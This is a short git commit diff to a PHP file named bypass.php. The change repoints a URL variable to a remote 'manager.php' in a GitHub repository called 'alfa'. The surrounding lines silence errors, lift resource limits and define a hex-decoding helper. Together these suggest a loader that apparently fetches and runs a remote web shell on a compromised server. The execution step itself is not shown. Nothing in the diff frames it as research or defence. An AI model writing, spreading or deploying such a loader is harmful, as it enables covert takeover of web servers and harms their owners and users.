afde393b039b736edcb1093be7a64212f9595314
tangsel1928 <72507843+tangsel1928@users.noreply.github.com>
2026-07-24 18:47:09 +0700

    Update bypass.php

--- bypass.php
+++ bypass.php
@@ -7,7 +7,7 @@ error_reporting(0);
 @ini_set('memory_limit', '512M');
 @set_time_limit(180);
 
-$u = 'https://raw.githubusercontent.com/tangsel1928/bypass/refs/heads/main/manager.php';
+$u = 'https://raw.githubusercontent.com/tangsel1928/alfa/refs/heads/main/manager.php';
 
 function _fx($hex)
 {
